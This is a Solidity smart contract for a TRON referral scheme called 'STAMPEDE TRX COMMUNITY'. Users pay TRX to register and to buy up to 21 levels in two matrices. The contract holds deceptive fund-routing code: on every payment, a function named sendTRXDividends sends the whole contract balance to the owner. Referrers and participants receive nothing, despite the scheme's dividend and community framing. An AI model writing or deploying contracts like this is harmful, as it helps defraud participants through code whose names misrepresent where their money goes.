//SourceUnit: STAMPEDE.sol

pragma solidity 0.5.10;

/**
*
* 
*Publish Date:15th June 2021
* 
*Coding Level: High
* 
*STAMPEDE TRX COMMUNITY
*
* 
**/

contract STAMPEDE_TRX_COMMUNITY {
    
     struct User {
        uint id;
        address referrer;
        mapping(uint8 => bool) activeLevels;
        mapping(uint8 => bool) globalMatrixactiveLevels;
    }
    
    uint public constant RegistrationTRX = 300;
    
    uint8 public constant LAST_LEVEL = 21;
    
    mapping(address => User) public users;
    
    mapping(uint8 => uint) public levelPrice;
    
    mapping(uint8 => uint) public GlobalMatrixPrice;

    uint public lastUserId = 1;
    
    address public owner;
    
    event UpgradeLevel(address indexed user);
    
    event UpgradeGlobalmatrix(address indexed user);

    event Registration(address indexed user, address indexed referrer);
    
    event WithdrawTron();

    constructor(address ownerAddress) public {
        
        levelPrice[1] = 500;
        levelPrice[2] = 1000;
        levelPrice[3] = 2000;
        levelPrice[4] = 4000;
        levelPrice[5] = 8000;
        levelPrice[6] = 16000;
        levelPrice[7] = 32000;
        levelPrice[8] = 50000;
        levelPrice[9] = 75000;
        levelPrice[10] = 100000;
        levelPrice[11] = 150000;
        levelPrice[12] = 200000;
        levelPrice[13] = 300000;
        levelPrice[14] = 400000;
        levelPrice[15] = 600000;
        levelPrice[16] = 800000;
        levelPrice[17] = 1200000;
        levelPrice[18] = 1600000;
        levelPrice[19] = 2000000;
        levelPrice[20] = 2500000;
        levelPrice[21] = 3000000;

        GlobalMatrixPrice[1] = 500;
        GlobalMatrixPrice[2] = 1000;
        GlobalMatrixPrice[3] = 2000;
        GlobalMatrixPrice[4] = 4000;
        GlobalMatrixPrice[5] = 8000;
        GlobalMatrixPrice[6] = 16000;
        GlobalMatrixPrice[7] = 32000;
        GlobalMatrixPrice[8] = 50000;
        GlobalMatrixPrice[9] = 75000;
        GlobalMatrixPrice[10] = 100000;
        GlobalMatrixPrice[11] = 150000;
        GlobalMatrixPrice[12] = 200000;
        GlobalMatrixPrice[13] = 300000;
        GlobalMatrixPrice[14] = 400000;
        GlobalMatrixPrice[15] = 600000;
        GlobalMatrixPrice[16] = 800000;
        GlobalMatrixPrice[17] = 1200000;
        GlobalMatrixPrice[18] = 1600000;
        GlobalMatrixPrice[19] = 2000000;
        GlobalMatrixPrice[20] = 2500000;
        GlobalMatrixPrice[21] = 3000000;

        owner = ownerAddress;
        
        User memory user = User({
            id: 1,
            referrer: address(0)
        });
        
        for (uint8 i = 0; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeLevels[i] = true;
        } 
        
        for (uint8 i = 0; i <= LAST_LEVEL; i++) {
            users[ownerAddress].globalMatrixactiveLevels[i] = true;
        } 
        
        users[ownerAddress] = user;
        
    }
    

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }
    
    
    function WithdrawalTronExt() external payable {
         withdrawTron();
    }
    
    
    function buyNewLevel(uint8 level) external payable {
            
        require(isUserExists(msg.sender), "User Not Exists. Need To Register First.");
        
        require(!users[msg.sender].activeLevels[level], "You Have Already Upgraded");
        
        require(level >= 1 && level <= LAST_LEVEL, "Invalid Level");
        
        if(level>1)
        {
            require(users[msg.sender].activeLevels[level-1], "Buy Previous Level First");
        }
        
        require(msg.value == levelPrice[level]*1000000 , "Invalid Level Price");
        
        users[msg.sender].activeLevels[level] = true;
       
        upgradePackage(msg.sender);
            
        emit UpgradeLevel(msg.sender);
            
    } 
    
    
    function buyGlobalMatrixNewLevel(uint8 level) external payable {
            
        require(isUserExists(msg.sender), "User Not Exists. Need To Register First.");
        
        require(!users[msg.sender].globalMatrixactiveLevels[level], "You Have Already Upgraded");
        
        require(level >= 1 && level <= LAST_LEVEL, "Invalid Level");
        
        if(level>1)
        {
         require(users[msg.sender].globalMatrixactiveLevels[level-1], "Buy Previous Level First");
        }
        
        require(msg.value == GlobalMatrixPrice[level]*1000000 , "Invalid Level Price");
        
        users[msg.sender].globalMatrixactiveLevels[level] = true;
       
        upgradeGlobalMatrixPackage(msg.sender);
            
        emit UpgradeGlobalmatrix(msg.sender);
            
    }
    
    
    function registration(address userAddress, address referrerAddress) private {
        
        require(!isUserExists(userAddress), "You Have Already Registered !");
        
        require(isUserExists(referrerAddress), "Referral Not Exists !");
        
        require(msg.value == RegistrationTRX*1000000 , "Invalid Registration Cost");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
		
        require(size == 0, "Can Not Be A Smart Contract");
        
         User memory user = User({
            id: lastUserId,
            referrer: referrerAddress
         });
        
        users[userAddress] = user;

        users[userAddress].referrer = referrerAddress;
        
        //users[userAddress].activeLevels[0] = true; 
        
        //users[userAddress].globalMatrixactiveLevels[0] = true;
        
        lastUserId++;

        sendTRXDividends();
        
        emit Registration(userAddress, referrerAddress);
    }
    
    function upgradePackage(address userAddress) private {
        sendTRXDividends();
    }
    
    function upgradeGlobalMatrixPackage(address userAddress) private {
        sendTRXDividends();
    }
    
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function sendTRXDividends() private {
        address(uint160(owner)).send(address(this).balance);
    }
    
    function withdrawTron() private  returns (uint256 ){
        
        require(msg.sender ==  address(uint160(owner)) ,"You Are Not Authorized.");
        
        require(isUserExists(msg.sender), "You Have Not Registered !");

        address(uint160(owner)).send(address(this).balance); 
        
        emit WithdrawTron();
    }
}